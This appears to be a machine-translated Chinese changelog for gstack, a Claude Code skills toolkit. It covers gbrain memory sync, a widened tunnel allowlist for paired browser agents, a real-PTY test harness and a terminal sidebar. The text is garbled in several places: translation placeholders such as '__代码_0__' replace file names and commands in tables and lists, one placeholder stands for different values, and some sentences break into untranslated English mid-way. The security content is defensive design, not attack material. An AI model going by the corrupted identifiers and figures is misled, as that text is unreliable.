# 变更日志

## [1.17.0.0] - 2026-04-26

## **您的 gstack 内存现在实际上位于 gbrain 中。**

对于上个月运行 `/setup-gbrain` 并注意到 `gbrain search` 找不到他们的 CEO 计划、学习或回顾的每个人：那是因为步骤 7 用 `status: "pending"` 编写了一个占位符 `consumers.json` 并称其完成。占位符指向的 HTTP 端点从未构建在 gbrain 端。此版本废弃了该方法并使用 gbrain v0.18.0 联合界面 (`gbrain sources` + `gbrain sync`) 代替。

升级后，`/setup-gbrain` 添加 Brain 存储库的 `git worktree`，将其注册为 gbrain（Supabase 或 PGLite）上的联合源，并运行初始同步。随后的 gstack 技能运行结束周期也会运行 `gbrain sync` ，因此新的工件会自动进入索引。仅限本地 Mac。无需云代理。 `/gstack-upgrade` 为现有用户运行一次性迁移。

### 升级后验证

```bash
gbrain sources list --json | jq '.sources[] | {id, page_count, federated}'
# Expect: two entries, your default brain plus a "gstack-brain-{user}"
# entry, both federated=true.

gbrain search "ethos" --source gstack-brain-{user} | head -5
# Expect: hits from your gstack repo content (readme, ethos, designs, etc).
```

### 运送了什么

`bin/gstack-gbrain-source-wireup` 是新的助手。它从 `~/.gstack/.git` 的原始 URL 派生出每个用户的源 ID（多重回退到 `~/.gstack-brain-remote.txt` 和 `--source-id` 标志），在 `~/.gstack-brain-worktree/` 处创建一个分离的 `git worktree`，将其注册为 gbrain 上的联合源，运行初始回填，并支持 `--strict`（第 7 步严格性）、`--uninstall`（全面拆解，包括未来发布的代码） plist）和 `--probe` （只读状态检查）。都是幂等的。该帮助器依赖于 `jq` （通过 `gstack-gbrain-detect` 可传递）。

帮助程序在启动时锁定数据库 URL（优先级：`--database-url` flag > `GBRAIN_DATABASE_URL`/`DATABASE_URL` env > 从 `~/.gbrain/config.json` 读取一次），并为每个子 `gbrain` 调用将其导出为 `GBRAIN_DATABASE_URL`。这意味着 `~/.gbrain/config.json` 中间同步的外部重写（例如，在另一个工作空间中运行的并发 `gbrain init --non-interactive`）无法在不同的大脑中重定向接线。根据 gbrain 的 `loadConfig()`，env-var URL 会覆盖该文件。 `/setup-gbrain` 的第 7 步从 `config.json` 中读取 URL 一次，并通过 `--database-url` 显式传递它，因此接线对于秒到分钟同步窗口期间的配置翻转具有鲁棒性。

`/setup-gbrain` 步骤 7 现在在 `gstack-brain-init` 之后使用 `--strict` 调用帮助器。 `/gstack-upgrade` 通过 `gstack-upgrade/migrations/v1.12.3.0.sh` 调用没有 `--strict` 的帮助程序，因此缺少 /old gbrain 是批量升级期间的良性跳过。 `bin/gstack-brain-restore` 在初始克隆后调用帮助程序，以便第二台 Mac 自动获取连接。 `bin/gstack-brain-uninstall` 调用 `--uninstall` 并删除旧版 `consumers.json`。

`bin/gstack-brain-init` 删除 60 行无效的消费者注册代码（HTTP POST 块、`consumers.json` 编写器、杂务提交）。 `bin/gstack-brain-restore` 删除了 18 行 `consumers.json` 令牌补水块（唯一使用它的消费者从未拥有真正的令牌）。 `bin/gstack-brain-consumer` 在其标头文档字符串中被标记为已弃用；在一个宽限周期后，在 v1.18.0.0 中删除。

`test/gstack-gbrain-source-wireup.test.ts` 是新的：在 `$PATH` 上使用假 `gbrain` 二进制文件进行 13 个单元测试，涵盖新鲜状态注册、幂等重新运行、漂移恢复（gbrain 没有 `sources update`，只有 `remove + add`）、`--strict` 故障模式、源 ID 后备链（`.git` → 远程文件 → 标志）、`--probe` 非突变、同步错误和__代码_8__。

### 重要的数字

升级后，这些可以在任何机器上重现。运行上面的验证命令来查看您自己的增量。

|公制|之前 (v1.16.0.0)|之后（v1.17.0.0）|
|---|---|---|
|__代码_0__ 尺寸|1（默认 `/data/brain`）|2（默认+ `gstack-brain-{user}`）|
|`consumers.json` 状态|`"pending"`，摄取网址 `""`|文件从新安装中删除|
|手动接线步骤|4（克隆+源添加+同步+cron）|0，第 7 步自动|
|辅助测试覆盖率|0 单元测试|13 个单元测试 (`bun test test/gstack-gbrain-source-wireup.test.ts`)|
|__代码_0__ 尺寸|363行|300 行（删除了 60 行死代码）|

本地 Mac 是工件的生产者，工作树随着 `~/.gstack/` 的提交自动前进。跨机器同步通过现有的 `gstack-brain-sync --once` 推送钩子在 GitHub 上运行。现在不需要新的 cron 基础设施；当 gbrain v0.21 代码图功能发布时，助手的 `--enable-cron` 标志是一个干净的扩展。

### 这对建筑商意味着什么

您的 gstack 内存现在可以搜索了。运行 CEO 计划审查或办公时间会议，同步在技能端自动运行，并且 `gbrain search` 从任何 gbrain 客户端（此 Claude Code 会议、未来的 Mac、可选的云代理（如 OpenClaw））查找计划内容。跨机器的真相来源之一。占位符已死。

### 对于贡献者

- `bin/gstack-brain-consumer` 在此版本中已弃用；在 v1.18.0.0 中删除。
- `gbrain_url` 和 `gbrain_token` 配置键现在无操作。它们在一个周期内保持可读性以实现向后兼容，在 v1.18.0.0 中被删除。
- 该分支上的三个预先存在的测试失败（`gstack-config gbrain keys > GSTACK_HOME overrides real config dir`、`no compiled binaries in git > git tracks no files larger than 2MB`、`Opus 4.7 overlay — pacing directive`）经验证在基本分支上也失败。超出本 PR 的范围；标记为后续行动。

## [1.16.0.0] - 2026-04-28

## **配对代理隧道白名单现在与文档已经承诺的内容相匹配。第 22 条军规已解决，gate 可进行单元测试。**

明显的错误：ngrok 隧道上的配对远程代理在 `newtab`、`tabs`、`goto-on-existing-tab` 以及操作员文档声称有效的一系列其他命令上命中了 403。隐藏的错误：v1.6.0.0 `TUNNEL_COMMANDS` 允许列表设置为 17 个条目，而 `docs/REMOTE_BROWSER_ACCESS.md`、`browse/src/cli.ts:546-586` 和面向操作员的指令块全部记录为 26。发布的允许列表默默地偏离了发布的设计意图。此版本弥补了这一差距：添加了 9 个命令（`newtab`、`tabs`、`back`、`forward`、`reload`、`snapshot`、`fill`、`url`、`closetab`），每个命令均受 `server.ts:613-624` 处现有的每个选项卡所有权检查的限制。作用域标记默认为 `tabPolicy: 'own-only'`，因此配对代理仍然无法导航、填充或关闭它不拥有的选项卡 - 与以前相同的隔离，只是覆盖更多动词。

### 重要的数字

分支总数来自 `git diff --shortstat origin/main..HEAD`。测试计数来自针对合并树的 `bun test browse/test/dual-listener.test.ts browse/test/tunnel-gate-unit.test.ts browse/test/pair-agent-tunnel-eval.test.ts browse/test/pair-agent-e2e.test.ts`。

|公制| Δ |
|---|---|
|隧道许可名单大小|**17 → 26 个命令** (+53%)|
|第 22 条军规决议|`newtab` → `goto` → `back` 链首次运行|
|门可测试性|内联正则表达式检查 → **纯导出的 `canDispatchOverTunnel()`** 函数|
|新的单元测试覆盖率|**53 需要 ** 在 `tunnel-gate-unit.test.ts` 中（允许、阻止、null/undefined/non-string、别名规范化）|
|新的行为覆盖范围|**4 个测试** 在 `pair-agent-tunnel-eval.test.ts` 中本地运行两个侦听器（无 ngrok）|
|源级守护|与 26 个命令文字 + 所有权豁免正则表达式的精确设置相等|
|所有免费测试|**在四个触及的测试文件上，69 次通过 / 0 次失败**|
|法典审查通过|**计划模式期间进行 2 轮外部语音**，纳入 7 项调查结果中的 6 项|

### 这对于运行配对代理的用户意味着什么

三件事立即改变。 **首先**，配对的代理实际上可以打开并驱动自己的选项卡，而无需触及之前创建的允许列表中的第 22 条规则。 `newtab` 成功（`server.ts:613` 的所有权豁免始终存在，但允许列表限制了该条目）； `goto`、`back`、`forward`、`reload`、`fill`、`closetab` 都在刚刚创建的选项卡上工作； `snapshot`、`url`、`tabs` 为代理提供有用的读取侧表面。 **第二**，隧道表面门现在可以进行单元测试 - `canDispatchOverTunnel(command)` 是纯的，从 `browse/src/server.ts` 导出，并由 53 个期望覆盖。未来将白名单文本与门逻辑分离的重构在几毫秒内无法通过免费测试。 **第三**，`pair-agent-tunnel-eval.test.ts` 使用绑定在 127.0.0.1 上的本地侦听器和隧道侦听器端到端地执行门（无需 ngrok），因此路由决策（“此请求击中隧道侦听器，运行门；此请求击中本地侦听器，跳过门”）在每个 PR 上断言。新的 `BROWSE_TUNNEL_LOCAL_ONLY=1` 环境变量在本地绑定第二个侦听器，而不调用 ngrok，门控到无操作外部测试模式。生产隧道仍然需要 `BROWSE_TUNNEL=1` + 有效的 `NGROK_AUTHTOKEN`。

### 逐项变更

#### 额外

- `browse/src/server.ts:111-120` `TUNNEL_COMMANDS` 集中的 9 个新命令：`newtab`、`tabs`、`back`、`forward`、`reload`、`snapshot`、`fill`、`url`、`closetab`。该集现已导出，因此测试可以直接引用文字。
-`canDispatchOverTunnel（命令：字符串|不明确的|null): boolean` in `browse/src/server.ts` — pure exported function. Handles non-string input, runs `canonicalizeCommand` for alias resolution, returns `TUNNEL_COMMANDS.has(canonical)`。
- `browse/src/server.ts:2080-2104` 中的 `BROWSE_TUNNEL_LOCAL_ONLY=1` 环境变量。到 `BROWSE_TUNNEL=1` 的仅测试同级分支，通过 `makeFetchHandler('tunnel')` 绑定第二个 `Bun.serve` 侦听器，而不调用 ngrok。将 `tunnelLocalPort` 保留到状态文件以供 eval 读取。
- `browse/test/tunnel-gate-unit.test.ts`: 53 预计涵盖所有 26 个允许的命令、20 个阻止的命令（配对、取消配对、cookie、设置、启动、重新启动、停止、隧道启动、token-mint 等）、null/undefined/empty/non-string 防御处理和别名规范化（例如 `set-content` 解析为 `load-html` 并被正确拒绝，因为 `load-html` 不是允许隧道）。
- `browse/test/pair-agent-tunnel-eval.test.ts`：4 个行为测试，在 `BROWSE_HEADLESS_SKIP=1 BROWSE_TUNNEL_LOCAL_ONLY=1` 下生成守护进程，将两个侦听器绑定到 127.0.0.1，通过现有的 `/pair` → `/connect` 仪式创建一个作用域令牌，并断言：(1) `newtab` 通过隧道通过大门； (2) 使用 `disallowed_command:pair` 在隧道 403 上执行 `pair`，并将新的拒绝日志条目写入 `~/.gstack/security/attempts.jsonl`； (3) 本地监听器上的 `pair` 不会触发隧道门； (4) 结果选项卡上的 catch-22 — `newtab` 后跟 `goto` 的回归测试不会使用 `Tab not owned by your agent` 进行 403。

#### 改变了

- `browse/test/dual-listener.test.ts`：必须包含 + 必须排除的断言替换为针对 26 个命令文字的精确设置相等测试。先前测试的仅交集样式让新命令潜入源代码而无需相应的测试更新 - 双向检查可以双向捕获它。添加了一个正则表达式断言，即 `server.ts:613` 处的 `command !== 'newtab'` 所有权豁免子句仍然存在（捕获从另一侧重新引入 catch-22 的重构）。
- `browse/test/dual-listener.test.ts`：更新了 `/command` 处理程序测试，以断言内联 `TUNNEL_COMMANDS.has(cmd)` 检查现在是 `canDispatchOverTunnel(body?.command)` — 证明门已委托给纯函数而不是重复。
- `docs/REMOTE_BROWSER_ACCESS.md:35,168`：将“17 个命令允许列表”更改为“26 个命令允许列表”。更正了拒绝命令列表（删除了 `eval`，它位于允许列表中；之前的文档是错误的）。
- `CLAUDE.md`：将传输层安全部分的“17 个命令浏览器驱动白名单”引用改为“26 个命令”。

#### 对于贡献者

- 该计划在 `/plan-eng-review` 下进行了审查，并在计划模式下进行了 2 个连续的法典外部语音传递。第一轮 Codex 发现了一个文档目标错误（我们将更新 `SIDEBAR_MESSAGE_FLOW.md` 而不是 `REMOTE_BROWSER_ACCESS.md`）和错误的层测试设计。第 2 轮法典发现第 1 轮修正仍然是错误的（所选测试工具仅绑定本地侦听器），并且文档承诺比允许列表多 6 个命令。 7项实质性调查结果中的6项全部落实；第 7 个（`cli.ts:656-668` 处预先存在的 `/pair-agent` `/health` 探测不匹配）被记录为超出范围。
- 一种已知的可接受风险：隧道上的 `tabs` 返回浏览器中所有选项卡的元数据，而不仅仅是代理拥有的选项卡。用户在与代理配对时创建了信任关系，代理已经无法读取无主选项卡的内容（写入命令被阻止，如果没有不在允许列表中的 `tab <id>` 命令，则无法切换活动选项卡），并且选项卡 ID 已通过不允许的 `goto` 上的 403 `hint` 字段泄漏。 Codex 指出，收紧这一点需要触及所有权门本身（在 `server.ts:603-614` 中调度之前，门会回退到 `getActiveTabId()`），这实质上超出了 catch-22 修复的范围。按已接受的方式记录在计划故障模式表中。

## [1.15.0.0] - 2026-04-26

## **Real-PTY 测试工具已发货。 11 项计划模式 E2E 测试、23 项单元测试，每次调用减少 50K 令牌。**

一个版本中包含两大工程。标题是一个真正的 PTY 测试工具——在 `Bun.spawn({terminal:})` 之上有 654 行 TypeScript——驱动实际的 `claude` 二进制文件并解析渲染的终端帧。对线束进行的六项新的 E2E 测试涵盖了以前在结构上无法实现的行为：每个 gstack `AskUserQuestion` 的格式合规性、计划设计 UI 范围检测（正覆盖）、与先前运行相比的工具预算回归、针对真实 git 固定装置的 `/ship` 端到端幂等性、`/plan-ceo` 答案路由和 `/autoplan` 阶段排序。该分支相对 `main` 减少了约 11.6K 行，同时添加了约 1,450 行新的 TypeScript 测试代码 - 重写了序言解析器，以更少的散文形式保留每个语义规则，并且捕获 AskUserQuestion 漂移的测试表面在每个 PR 上从零扩展到门层。

### 重要的数字

分支总数来自 `git diff --shortstat origin/main..HEAD`。令牌级别的减少来自于针对重写的解析器（`bun run gen:skill-docs --host all`）重新生成每个 `SKILL.md` 。 E2E 数字来自干净工作树上的 `EVALS=1 EVALS_TIER=gate bun test test/skill-e2e-*.test.ts`。

|公制| Δ |
|---|---|
|净分支大小与 `main`|**−11,609 行**（89 个文件，+7,240 / −18,849）|
|添加了新的测试文件|**8 个文件**（1 个线束单元测试 + 7 个 E2E 测试）|
|新测试代码已发布|**~1,453 行** TypeScript|
|Real-PTY 线束模块|**654 行** 在 `test/helpers/claude-pty-runner.ts` 中|
|每次调用节省代币|**−196K 令牌 (−25%)** 冷读|
|`plan-ceo-review` 前言|**−43%** (54 KB → 31 KB)|
|Plan模式E2E测试计数| **5 → 11** |
|新的网关层付费端到端测试|**+3**（格式合规性、UI 设计、预算回归）|
|新的定期付费 E2E 测试|**+3**（模式路由、船舶幂等性、自动计划链）|
|辅助单元测试覆盖率|**+23 项测试** 用于解析器 + 预算基元|
|所有免费测试|**49 人通过，0 人失败**|

|技能等级|每次调用表面| Δ |
|---|---|---|
|Tier-≥3 计划审查（完整序言）|〜50 KB → 〜30 KB| −40% |
|一级快速技能|〜12 KB → 〜9 KB| −25% |

现在，每次 gstack 调用都会在冷读时向模型发送约 50K 的令牌，这大约是为实际工作释放的典型 200K 上下文窗口的四分之一。 Tier-≥3 计划审查保留了其完整的功能表面（大脑同步、上下文恢复、路由注入），但仍然丢失了近一半的字节。

### 这对建筑商意味着什么

以前不可能捕捉到的三种新的回归类别现在阻止了所有 PR。 **格式漂移**：在真实渲染的终端上发现了 `AskUserQuestion` 上缺少 `Recommendation:` 行或缺少 Pros/Cons 项目符号 - 而不是模型声称的其将显示的内容。 **有条件的技能路径**：当没有 UI 范围时，`/plan-design-review` 必须提前退出，但在此版本之前，没有任何内容测试过*积极*路径；将检测器翻转为“始终提前退出”的回归可能会悄无声息地发生。 **工具预算回归**：序言更改使任何技能消耗其先前工具调用的 2 倍，从而导致在每个 `bun test` 上运行的免费、分支范围的断言失败。

线束本身是一个可重用的基元。 `runPlanSkillObservation()` 监视计划模式终端输出并将结果分类为 `asked` / `plan_ready` / `silent_write` / `exited` / `timeout`。建立在其之上的三个定期层测试涵盖了较重的情况——多阶段链排序、端到端的幂等性状态机以及通过 8-12 个连续提示进行应答路由——这些测试不符合每个 PR 的预算，但每周运行一次。拉动并运行 `bun run gen:skill-docs --host all`，每个技能调用都比之前的版本小得多，并且经过了更好的测试。

### 逐项变更

#### 额外

- `test/helpers/claude-pty-runner.ts`：使用 `Bun.spawn({terminal:})` 的真实 PTY 测试工具（Bun 1.3.10+ 有内置 PTY — 无 `node-pty`，无本机模块）。将 `launchClaudePty()` 公开为原始会话控制，将 `runPlanSkillObservation()` 公开为计划模式技能测试的高级合同。
- `claude-pty-runner.ts` 中的 `parseNumberedOptions(visible)` 和 `isPermissionDialogVisible(visible)` 助手。测试现在可以通过标签查找选项索引，而无需硬编码位置，并自动授予 Claude Code 的文件编辑/工作区信任/bash 权限对话框，这些对话框在前导码副作用期间触发。
- `test/helpers/eval-store.ts` 中的 `findBudgetRegressions()` 和 `assertNoBudgetRegression()`。纯函数返回的测试与之前的评估运行相比，工具或轮数增长了 >2 倍，底线为 5 个先前的工具/3 个先前的轮次，以避免噪音。环境覆盖 `GSTACK_BUDGET_RATIO`。
- 在线束上进行 6 项新的真实 PTY E2E 测试：
- `skill-e2e-ask-user-question-format-compliance.test.ts` (gate, ~$0.50/run)：断言每个 gstack `AskUserQuestion` 渲染包含 7 个强制格式元素（ELI10、Recommendation、Pros/Cons 和 ✅/❌、Net、`(recommended)` 标签）。
- `skill-e2e-plan-design-with-ui.test.ts`（门，〜$0.80/run）：`/plan-design-review` UI范围检测的积极覆盖。与现有的无 UI 提前退出测试相对应 - 如果没有它，将检测器翻转为“始终提前退出”的回归将不会被检测到。
- `skill-budget-regression.test.ts`（门，免费）：仅限分支范围的库断言，与之前记录的运行相比，没有技能消耗 >2 倍的工具或回合。
- `skill-e2e-plan-ceo-mode-routing.test.ts`（定期，~$3/run）：验证 AskUserQuestion 答案路由 — HOLD SCOPE 选择通往严格语言的路线，SCOPE EXPANSION 选择通往扩展语言的路线。
- `skill-e2e-ship-idempotency.test.ts`（周期性，〜$3/run）：针对真实的 git 固定装置端到端运行 `/ship` ，并内置 `STATE: ALREADY_BUMPED` ；断言没有双重碰撞，没有双重提交，没有固定装置突变。
- `skill-e2e-autoplan-chain.test.ts`（周期性，〜$8/run）：通过在每个 `**Phase N complete.**` 标记出现时设置时间戳来断言 `/autoplan` 阶段顺序。
- `test/helpers-unit.test.ts`：23 个单元测试，涵盖 `parseNumberedOptions` 边缘情况（空、部分绘制、>9 个选项、陈旧与新鲜锚定）和 `findBudgetRegressions`（本底噪声、环境覆盖、缺少工具数据）。
- `test/fixtures/plans/ui-heavy-feature.md`：为新的 UI 设计测试制定了具有明确 UI 范围关键字的计划。
- 自动处理工作区信任对话框，以便测试在临时目录中运行，无需手动干预。
- 结果合同：`asked`|__代码_0__|__代码_0__|__代码_0__|__代码_0__。测试在 `asked` 或 `plan_ready` 上通过，在其余部分失败。

#### 改变了

- 18 个压缩前导码解析器：`generate-ask-user-format.ts`、`generate-brain-sync-block.ts`、`generate-completeness-section.ts`、`generate-completion-status.ts`、`generate-confusion-protocol.ts`、`generate-context-health.ts`、`generate-context-recovery.ts`、`generate-continuous-checkpoint.ts`、`generate-lake-intro.ts`、`generate-preamble-bash.ts`、`generate-proactive-prompt.ts`、`generate-routing-injection.ts`、`generate-telemetry-prompt.ts`、`generate-upgrade-check.ts`、 __代码_14__、__代码_15__、__代码_16__、__代码_17__。
- 重新生成所有 47 个生成的 `SKILL.md` 文件； 3艘船金色装置已重新生成。
- Plan-* 技能保留完整的序言表面（大脑同步、上下文恢复、路由注入）——早期削减这些的微小尝试在诊断它们为承载后被恢复。
- 将 5 个现有计划模式测试（`plan-ceo`、`plan-eng`、`plan-design`、`plan-devex`、`plan-mode-no-op`）重写到具有 300 秒观察预算的新线束上。在 790 秒内，针对真实的 `claude` 二进制文件，在 `EVALS=1 EVALS_TIER=gate` 下进行了所有 5 次验证。
- `isNumberedOptionListVisible` 正则表达式允许 `stripAnsi` 删除的 TTY 光标定位转义 (`\x1b[40C`) 中的空格崩溃 — `\b2\.` 在字到字转换上失败，其中剥离的输出读取 `text2.`。

#### 固定的

- `scripts/skill-check.ts`：新的 `isRepoRootSymlink()` 帮助程序，因此开发人员安装的安装在 `host/skills/gstack` 处的存储库根目录（例如，codex 的 `.agents/skills/gstack`）将被跳过，而不是重复计算。
- `test/skill-validation.test.ts`：已知大型夹具豁免使 `browse/test/fixtures/security-bench-haiku-responses.json`（27 MB BrowseSafe-Bench 重放夹具，有意）超出大小警告范围。

#### 已删除

- `test/helpers/plan-mode-helpers.ts`：被 `claude-pty-runner.ts` 取代。重写后剩余调用者为零。

#### 对于贡献者

- `test/helpers/touchfiles.ts`：5 个计划模式测试选择 + e2e-harness-audit 选择现在指向 `claude-pty-runner.ts` 而不是已删除的助手。 6 个新条目（`ask-user-question-format-pty`、`plan-ceo-mode-routing`、`plan-design-with-ui-scope`、`budget-regression-pty`、`ship-idempotency-pty`、`autoplan-chain-pty`），级别分类：3 个门、3 个周期性。
- `test/e2e-harness-audit.test.ts`：将 `runPlanSkillObservation` 识别为与旧版 `canUseTool` / `runPlanModeSkillTest` 模式一起的有效覆盖路径。
- 新的单元测试：`test/gen-skill-docs.test.ts` 断言计划审查前导码保持在 33 KB 以下，而精简的语音部分保留其承载语义契约（以要点引导、命名文件、用户结果框架、非公司、非 AI 词汇、用户主权）。
- `test/touchfiles.test.ts`：特定于技能的更改选择计数更新为 15 → 18，以匹配依赖于 `plan-ceo-review/**` 的 6 个新触摸文件条目。

## [1.14.0.0] - 2026-04-25

## **gstack 浏览器侧边栏现在是具有实时选项卡感知功能的交互式 Claude Code REPL。**

打开侧面板，Claude Code 就在真实的终端中。输入内容，观察代理工作，切换浏览器选项卡，克劳德就会看到变化。旧的一次性聊天队列已经消失。双向对话、斜杠命令、`/resume`、ANSI 颜色，所有这些。再加上一个 `$B tab-each` 命令，它可以在每个打开的选项卡上扇出单个浏览命令并返回每个选项卡的 JSON 结果。

### 重要的数字

|公制|前|后| Δ |
|---|---|---|---|
|侧边栏表面|聊天（一次性 `claude -p`）+ 3 次调试|终端（实时 PTY）+ 3 调试|-1 表面，+交互式|
|每个会话产生的子进程|许多（每条聊天消息一条）|一（PTY 克劳德，懒惰生成）| -N |
|`extension/sidepanel.js` 中的行| 1969 | 1042 | -47% |
|总差异| — |27 个文件，+2875 / -3885|-1010网|
|新单元+集成+回归测试| 0 | 56+ | +56 |
|实时 `tabs.json` 推送延迟|n/a（无实时状态）|`chrome.tabs` 事件发生后 <50 毫秒|新能力|

### 这对建筑商意味着什么

打开侧边栏，输入。真正的 PTY 意味着斜杠命令、`/resume`、真正的 ANSI 渲染、真正的 claude 进程生命周期。在 Claude 运行时切换浏览器选项卡，并就地更新 `<stateDir>/tabs.json` + `active-tab.json` — Claude 可以读取它们，无需询问 `$B tabs`。需要在每个选项卡上执行相同的操作吗？ `$B tab-each <command>` 返回一个 JSON 数组，完成后恢复原始活动选项卡，不会窃取操作系统焦点。

旧的聊天队列消失了。 `sidebar-agent.ts`、`/sidebar-command`、`/sidebar-chat`、`/sidebar-agent/event` 全部删除。 Cleanup / Screenshot / Cookies 工具栏按钮保留在终端窗格中 - Cleanup 通过 `window.gstackInjectToTerminal()` 将其提示直接传送到实时 PTY，而不是生成另一个 `claude -p`。

### 逐项变更

#### 额外

- **交互式终端侧边栏选项卡。** xterm.js + 一个未编译的 `terminal-agent.ts` Bun 进程，该进程使用 `Bun.spawn({terminal: {rows, cols, data}})` 生成 claude。侧面板打开时自动连接，无需按键。
- **`$B tab-each <command>`** — 用于多选项卡工作的扇出助手。返回 `{command, args, total, results: [{tabId, url, title, status, output}]}`。跳过 chrome:// 页面，在迭代之前对内部命令进行范围检查，在 `finally` 块中恢复原始活动选项卡，永远不会将焦点从用户的前台应用程序上移开。
- **实时选项卡状态文件。** `<stateDir>/tabs.json`（包含 id、url、标题、活动、固定、声音、windowId 的完整列表）和 `<stateDir>/active-tab.json`（当前活动）。对每个 `chrome.tabs` 事件进行原子更新（激活、创建、删除、URL/title 更改）。克劳德按需读取而不是运行 `$B tabs`。
- **选项卡感知系统提示**在生成时通过 `claude --append-system-prompt` 注入，因此模型无需告知即可了解状态文件和 `$B tab-each` 命令。
- **终端工具栏中始终可见的重新启动按钮**。随时强制重新启动克劳德，而不仅仅是从“会话结束”状态。

#### 改变了
- **侧边栏仅限终端。** 不再有“终端”|页脚中的 Chat` primary tab nav. Activity / Refs / Inspector still live behind the `debug` 切换。快速操作（🧹 清理 / 📸 屏幕截图 / 🍪 Cookies）移至终端工具栏。
- **WebSocket 身份验证使用 `Sec-WebSocket-Protocol`** 而不是 cookie。浏览器无法在 WS 升级时设置 `Authorization`，并且 `SameSite=Strict` cookie 无法在从 chrome 扩展源从 server.ts:34567 到代理的随机端口的跨端口跳转中幸存。令牌依赖于 `new WebSocket(url, [`gstack-pty.<token>`])` 并且代理回显协议（Chromium 会关闭不选择协议的连接）。
- **清理按钮现在驱动实时 PTY。** 单击“🧹清理”可通过 `window.gstackInjectToTerminal()` 将清理提示直接注入克劳德。检查器“发送到代码”操作使用相同的路径。不再有 `/sidebar-command` 帖子。
- **调试选项卡关闭后重新绘制。** 当容器从 `display: none` 翻转回 `display: flex` 时，xterm.js 不会自动重绘。现在，当窗格可见时，`#tab-terminal` 类属性上的 MutationObserver 会强制执行 `fitAddon.fit() + term.refresh() + resize` 推送。

#### 已删除
- **`browse/src/sidebar-agent.ts`** — 一次性 `claude -p` 队列工作器。 ~900 行。
- **服务器端点**：`/sidebar-command`、`/sidebar-chat[/clear]`、`/sidebar-agent/{event,kill,stop}`、`/sidebar-tabs[/switch]`、`/sidebar-session{,/new,/list}`、`/sidebar-queue/dismiss`。 ~600 行。
- server.ts 中的 **聊天相关状态**：`ChatEntry`、`SidebarSession`、`TabAgentState`、`pickSidebarModel`、`addChatEntry`、`processAgentEvent`、`killAgent`、代理运行状况看门狗、`chatBuffer`、每个选项卡代理映射。
- **sidepanel.html 中的聊天 UI：主选项卡导航、`<main id="tab-chat">`、聊天输入栏、实验性“浏览器副驾驶”横幅、安全事件横幅、`clear-chat` 页脚按钮。
- **五个过时的测试文件**：`sidebar-agent.test.ts`、`sidebar-agent-roundtrip.test.ts`、`security-e2e-fullstack.test.ts`、`security-review-fullstack.test.ts`、`security-review-sidepanel-e2e.test.ts`。再加上 5 个仅用于聊天的描述块（loadSession 会话 ID 验证、switchChatTab DocumentFragment、pollChat 可重入、侧边栏选项卡 URL 清理、代理队列安全）。

#### 对于贡献者
- **`browse/src/pty-session-cookie.ts`** 镜像 `sse-session-cookie.ts`。相同的 TTL、相同的机会性修剪、单独的注册表（PTY 代币绝不能与 SSE 代币一样有效，反之亦然）。
- **`docs/designs/SIDEBAR_MESSAGE_FLOW.md`** 围绕终端流程重写：WebSocket 升级、双令牌模型（`AUTH_TOKEN` 对应 `/pty-session`、`gstack-pty.<token>` 对应 `/ws`、`INTERNAL_TOKEN` 对应服务器↔代理环回）、威胁模型边界（终端选项卡故意绕过提示注入堆栈；用户击键是信任源）。
- **`browse/test/terminal-agent.test.ts`**（16 次测试）+ `terminal-agent-integration.test.ts`（真正的 `/bin/bash` PTY 往返，原始 `Sec-WebSocket-Protocol` 升级验证）+ `tab-each.test.ts`（10 次模拟 `BrowserManager` 测试）+ `sidebar-tabs.test.ts`（27 个锁定聊天记录不变量的结构断言）。
- **CLAUDE.md** 更新了双令牌模型、cookie 与协议基本原理以及跨窗格注入模式。
- **`vendor:xterm`** 构建步骤在构建时将 `xterm@5.x` 和 `xterm-addon-fit` 从 `node_modules/` 复制到 `extension/lib/` 中。 xterm 文件被 gitignored。
- **TODOS.md** 包含三个 v1.1+ 后续内容：跨侧边栏重新加载的 PTY 会话生存（问题 1C 推迟）、`/health` `AUTH_TOKEN` 分发审核（法典发现、预先存在的软泄漏）以及删除现已失效的 `security-classifier.ts` ML 管道。

## [1.13.0.0] - 2026-04-25

## **`/gstack-claude` 为非克劳德主持人提供只读的外部语音。**

此版本添加了 `/codex` 的相反内容：外部主机现在可以要求 Claude 进行审查、对抗性挑战或只读咨询，而无需提供嵌套的 Claude 突变工具。

### 额外

- `claude/SKILL.md.tmpl`：新的仅限外部的 `/gstack-claude` 技能，具有 `review`、`challenge` 和 `consult` 模式。
- 查看和质询模式将检测到的基分支差异与 `--disable-slash-commands` 一起馈送到 `claude -p --tools ""`。
- 咨询模式仅允许 `Read,Grep,Glob`，明确禁止 `Bash,Edit,Write`，保存 `.context/claude-session-id`，并且可以恢复之前的咨询会话。
- Claude 提示传输现在使用通过标准输入通过管道传输的 `/tmp/gstack-claude-prompt-*` 文件并进行清理。
- 身份验证检查需要 `claude` CLI 加上 `~/.claude/.credentials.json` 或 `ANTHROPIC_API_KEY`。
- JSON 输出解析提取 `result`、`usage`、`model`、`session_id` 和 `is_error`。

### 固定的

- `hosts/claude.ts`：从克劳德主机生成中排除克劳德外部语音技能。
- `test/brain-sync.test.ts`：`GSTACK_HOME` 隔离测试现在快照并保留真实的配置文件，而不是假设本地计算机状态。
- `claude/SKILL.md.tmpl`：在 review/challenge 模式下使用 `mktemp` 进行差异捕获，而不是基于 `$$` 的临时路径，避免并发调用之间的冲突。

### 改变了

- `test/skill-validation.test.ts`：跟踪文件大小检查现在是建议性的。大型装置在 git 中仍然允许，并报告为 `[size-warning]` 而不是使套件失败。
- `test/gen-skill-docs.test.ts`：生成覆盖范围现在断言外部主机文档包括 `gstack-claude/SKILL.md`，而 Claude 主机输出省略 `claude/SKILL.md`。

## [1.12.2.0] - 2026-04-24

## **`/setup-gbrain` Polish：路径解析、存储库初始化顺序、MCP 用户范围。**

对 /setup-gbrain 入门路径进行了小幅改进。

### 固定的
- `bin/gstack-gbrain-install`：用 `awk '{print $NF}'` 解析 `gbrain --version` 输出，以便 D19 PATH-shadow 检查仅比较版本号。
- `bin/gstack-brain-init`：从 `gh repo create` 中省略 `--source`。后续步骤显式处理 `git init` + 远程设置。
- `setup-gbrain` 第 9 步：冒烟测试使用 `gbrain put <slug>`，主体通过标准输入进行管道传输。
- `setup-gbrain` 步骤 5a：MCP 使用 `--scope user` 和 gbrain 二进制文件的绝对路径进行注册，因此 `mcp__gbrain__*` 工具在计算机上的每个 Claude Code 会话中都可用。

### 改变了
- `test/gstack-brain-init-gh-mock.test.ts`：断言 `gh repo create` 调用中不存在 `--source`。

## [1.12.1.0] - 2026-04-24

## **计划模式复习技能直接运行复习，不再有“退出并重新运行”提示。**

